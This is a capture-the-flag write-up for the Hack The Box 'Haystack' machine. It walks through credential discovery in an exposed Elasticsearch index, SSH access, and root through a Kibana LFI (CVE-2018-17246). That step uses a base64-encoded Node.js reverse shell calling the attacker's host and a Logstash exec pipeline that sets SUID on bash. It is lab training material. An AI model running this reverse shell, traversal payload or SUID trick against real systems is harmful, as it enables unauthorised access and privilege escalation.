![Haystack.PNG](/assets/Machines/Easy/Haystack/Haystack.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.115
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.115
```

**Output**
```bash
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9200/tcp open  wap-wsp
```

3. Visit website

![web.PNG](/assets/Machines/Easy/Haystack/web.PNG)

4. Download picture and search metadata with **exiftool** and **steghide**

* With **exiftool** we don't get important information.
* Steghide report this:
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/HayStack]
└─# steghide extract -sf needle.jpg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

* If you print **strings** for the image you can find this:
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/HayStack]
└─# strings needle.jpg

...
#=pMr
BN2I
,'*'
I$f2/<-iy
bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
```

5. Decode the string found in **base64**
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/HayStack]
└─# echo "bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==" | base64 -d; echo
la aguja en el pajar es "clave"
```

6. Use nmap to discover services and their versions are running in open ports.
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/HayStack]
└─# nmap -sCV -p22,80,9200 10.10.10.115 -oN versions
```
**Output**
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2a8de2928b14b63fe42f3a4743238b2b (RSA)
|   256 e75a3a978e8e728769a30dd100bc1f09 (ECDSA)
|_  256 01d259b2660a9749205f1c84eb81ed95 (ED25519)
80/tcp   open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (text/html).
9200/tcp open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
| http-methods: 
|_  Potentially risky methods: DELETE
```

* We know in port 9200 is running other website, visit!

![elasticy.PNG](/assets/Machines/Easy/Haystack/elasticy.PNG)

* If you don't know nothing about `ElasticSearch` you should visit [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch).


## Basic Enumeration ElasticSearch
* Get basic information about page

* **URL**: http://10.10.10.115:9200/_cat/indices?v

![basic.PNG](/assets/Machines/Easy/Haystack/basic.PNG)

* We can get more information about any index with: `http://10.10.10.115:9200/<index>`
* Search about all information about an index: `http://10.10.10.115:9200/<index>/_search?pretty=true&size=10000`

7. When your search about all information you really get a lot information **look for a needle in a haystack**, wait... Previously we can get a string `la aguja en el pajar es "clave"`, use **grep** to search important information like:
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/HayStack]
└─# curl -s -X GET "http://10.10.10.115:9200/<index>/_search?pretty=true&size=10000" | jq | grep -i 'clave'
```

* Use `jq` to parse infornmation in **json format**.
* Use **grep** with band **i** to search information in case insensitive.
* `index` like **.kibana**, **quotes** or **bank**

+ In this case the index with relevant information are **quotes**.
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/HayStack]
└─# curl -s -X GET "http://10.10.10.115:9200/quotes/_search?pretty=true&size=10000" | jq | grep -i 'clave'
          "quote": "Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="
          "quote": "Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "
```

* The information getting are encode in base64.

`First string` 
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/HayStack]
└─# echo "cGFzczogc3BhbmlzaC5pcy5rZXk=" | base64 -d; echo
pass: spanish.is.key
```
***
`Second string`
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/HayStack]
└─# echo "dXNlcjogc2VjdXJpdHkg" | base64 -d; echo
user: security
```

8. Connect with this credentials in ssh
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/HayStack]
└─# ssh security@10.10.10.115      
The authenticity of host '10.10.10.115 (10.10.10.115)' can't be established.
ED25519 key fingerprint is SHA256:J8TOL2f2yaJILidImnrtW2e2lcroWsFbo0ltI9Nxzfw.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.115' (ED25519) to the list of known hosts.
security@10.10.10.115's password: 
Last login: Wed Feb  6 20:53:59 2019 from 192.168.2.154
[security@haystack ~]$ whoami
security
```

9. Show user flag
```
[security@haystack ~]$ cat user.txt 
433b15de302ea4732eaceff8abc0917e
```

---
---
---
### **Privileges Escalation** 💀
1. Search any information to try escalate privileges.
```
[security@haystack ~]$ ss -nltp
```
**Output**
```
LISTEN      0      128       127.0.0.1:5601        *:* 
```
* This port is access to Kibana.

* In this case we need to do port forwarding.
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/HayStack]
└─| sshpass -p 'spanish.is.key' ssh security@10.10.10.115 -L 5601:127.0.0.1:5601
```

2. Visit new webpage.

![kibana.PNG](/assets/Machines/Easy/Haystack/kibana.PNG)

3. If you search for any exploit you cand find this [CVE-2018-17246](https://github.com/mpgn/CVE-2018-17246).

4. Then, you need to create a exploit in **js** in any folder of system (I create in /tmp directory)

* Copy the shell provides in github project and encode in **base64** (Remember change port and IP)
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/HayStack]
└─# cat exploit.js | base64                             
KGZ1bmN0aW9uKCl7CiAgICB2YXIgbmV0ID0gcmVxdWlyZSgibmV0IiksCiAgICAgICAgY3AgPSBy
ZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksCiAgICAgICAgc2ggPSBjcC5zcGF3bigiL2Jpbi9zaCIs
IFtdKTsKICAgIHZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwogICAgY2xpZW50LmNvbm5l
Y3QoMTMzNywgIjE3Mi4xOC4wLjEiLCBmdW5jdGlvbigpewogICAgICAgIGNsaWVudC5waXBlKHNo
LnN0ZGluKTsKICAgICAgICBzaC5zdGRvdXQucGlwZShjbGllbnQpOwogICAgICAgIHNoLnN0ZGVy
ci5waXBlKGNsaWVudCk7CiAgICB9KTsKICAgIHJldHVybiAvYS87IC8vIFByZXZlbnRzIHRoZSBO
b2RlLmpzIGFwcGxpY2F0aW9uIGZvcm0gY3Jhc2hpbmcKfSkoKTsK
```

* Copy the output and create a file with this content but decode
```
[security@haystack ~]$ echo "KGZ1bmN0aW9uKCl7CiAgICB2YXIgbmV0ID0gcmVxdWlyZSgibmV0IiksCiAgICAgICAgY3AgPSBy
> ZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksCiAgICAgICAgc2ggPSBjcC5zcGF3bigiL2Jpbi9zaCIs
> IFtdKTsKICAgIHZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwogICAgY2xpZW50LmNvbm5l
> Y3QoMTMzNywgIjE3Mi4xOC4wLjEiLCBmdW5jdGlvbigpewogICAgICAgIGNsaWVudC5waXBlKHNo
> LnN0ZGluKTsKICAgICAgICBzaC5zdGRvdXQucGlwZShjbGllbnQpOwogICAgICAgIHNoLnN0ZGVy
> ci5waXBlKGNsaWVudCk7CiAgICB9KTsKICAgIHJldHVybiAvYS87IC8vIFByZXZlbnRzIHRoZSBO
> b2RlLmpzIGFwcGxpY2F0aW9uIGZvcm0gY3Jhc2hpbmcKfSkoKTsK" | base64 -d > exploit.js
```

5. Now you can do **LFI** and access the previously created exploit.
```
[security@haystack tmp]$ curl -s -X GET "localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../tmp/exploit.js"
```

* Remember listen in port choosed.

**Output**
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/HayStack]
└─# nc -lvnp 4444  
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.115] 39798
whoami
kibana
```

* Spawn a bash with python `python -c "import pty; pty.spawn('/bin/bash')"`

6. Search for files with user **kibana**

``` 
bash-4.2$ find / -user kibana 2>/dev/null 
```
**Output**
```
/etc/logstash/startup.options
/opt/kibana
```

7. Examine `/etc/logstash/conf.d` directory
```
bash-4.2$ ls -la
-rw-r-----. 1 root kibana  131 jun 20  2019 filter.conf
-rw-r-----. 1 root kibana  186 jun 24  2019 input.conf
-rw-r-----. 1 root kibana  109 jun 24  2019 output.conf
```

* **filter.conf**
```bash
filter {
        if [type] == "execute" {
                grok {
                        match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
                }
        }
}
```
---
* **input.conf**
```bash
input {
        file {
                path => "/opt/kibana/logstash_*"
                start_position => "beginning"
                sincedb_path => "/dev/null"
                stat_interval => "10 second"
                type => "execute"
                mode => "read"
        }
}
```
---
* **output.conf**
```bash
output {
        if [type] == "execute" {
                stdout { codec => json }
                exec {
                        command => "%{comando} &"
                }
        }
}
```

### This all output we can get:
* To execute a command we can need next sintax: `Ejecutar comando : <Command>`
> **\s** is a regular expression to blank spaces
* Path to save this file is in **/opt/kibana** and put a name with prefix `logstash_`

8. Create a script to execute a command to put perm SUID in **bash**
```bash
bash-4.2$ pwd
/opt/kibana
bash-4.2$ cat logstash_script 
Ejecutar comando : chmod u+s /bin/bash
```

* Look permissions of `/bin/bash`

```
bash-4.2$ ls -la /bin/bash
-rwsr-xr-x. 1 root root 964608 oct 30  2018 /bin/bash
```

9. Spawn a bash how root and show root flag.
```
bash-4.2$ bash -p
bash-4.2# whoami
root
```
---
```
bash-4.2# cat /root/root.txt  
ee964922db84bd1842da7de1568ebbca
```